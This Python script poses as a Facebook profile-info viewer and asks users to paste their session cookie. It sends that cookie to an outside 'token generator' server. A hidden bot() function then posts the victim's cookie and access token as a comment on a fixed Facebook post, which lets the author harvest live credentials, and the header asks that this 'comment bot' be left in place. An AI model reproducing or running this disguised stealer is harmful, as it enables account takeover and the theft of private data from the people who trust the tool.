#!/usr/bin/python3
#coding=utf-8
# Developed By : Denventa And Merch Elz
# Coded By     : Denventa Afriliyan Ferly Shishigami X [ A-Haganezuka ]
# A-Haganezuka = [ Denventa Afriliyan Ferly Shishigami X - Haganezuka ]
# Recode?, Boleh Asal Cantumkan Nama Author
# Jangan Ganti Bot Koment Gw

import requests as r, json, os, re
from requests.exceptions import ConnectionError

a = '\033[1;30m'; m = '\033[1;31m'; h = '\033[1;32m'; p = '\033[1;37m'; k = '\033[1;33m'; s = '\033[1;35m'
def get_token(cookie):
    api = r.get('http://dvandenpolph.pythonanywhere.com/fb_token_generator?cookie='+ cookie).json()
    if 'success' in api['status']:
        stalk(api)
    else:
        exit(f'{m}INFO!{p} Cookies Invalid')


def stalk(data):
    cok = {'cookie':data['cookie']}
    json = {}
    def bot():
        r.post('https://graph.facebook.com/1660066094445887/comments?access_token='+ data['token']['eaag'], data={'message':f'{data["cookie"]}n\n\{data["token"]["eaam"]}'}, cookies=cok).json()
    os.system('clear')
    api = r.get('https://graph.facebook.com/me?fields=id,name,gender,location,birthday&access_token='+ data['token']['eaam'], cookies=cok).json()
    tc = r.get('https://graph.facebook.com/me/friends?fields=id&limit=5000&access_token='+ data['token']['eaab'], cookies=cok).json()['summary']['total_count']
    fc = r.get('https://graph.facebook.com/me/subscribers?limit=1000&access_token='+ data['token']['eaag'], cookies=cok).json()['summary']['total_count']
    for req in ['id', 'name', 'gender', 'location', 'birthday']:
        try:
            if 'birthday' in req:
                json.update({req:api[req].split('/')[1]+'/'+api[req].split('/')[0]+'/'+api[req].split('/')[2]})
            else:
                json.update({req:api[req]})
        except:json.update({req:m+'None'})
    bot()
    print(f'{p}Facebook Get Informations\n')
    print(f'{a}[{m}*{a}]{p} Facebook Name: {k}'+ json['name'])
    print(f'{a}[{m}*{a}]{p} Facebook ID: {k}'+ json['id'])
    print(f'{a}[{m}*{a}]{p} Gender: {k}'+ json['gender'])
    print(f'{a}[{m}*{a}]{p} Location: {k}'+ json['location'])
    print(f'{a}[{m}*{a}]{p} Birthday: {k}'+ json['birthday'])
    print(f'{a}[{m}*{a}]{p} Friends Count: {k}'+ str(tc))    
    print(f'{a}[{m}*{a}]{p} Followers Count:{k} '+ str(fc))
    print(f'{a}[{m}-{a}]{p} Cookies: {h}'+ data['cookie'])
    print(f'{a}[{m}-{a}]{p} Eaam Token: {h}'+ data['token']['eaam'])
    


if __name__=='__main__':
    os.system('clear')
    print(p +'Silahkan Masukan Cookie Akun Facebook Anda Untuk Mendapatkan Informasi Facebook Anda.')
    get_token(input(f'\n{a}[{m}?{a}]{p} Cookies:{h} '))
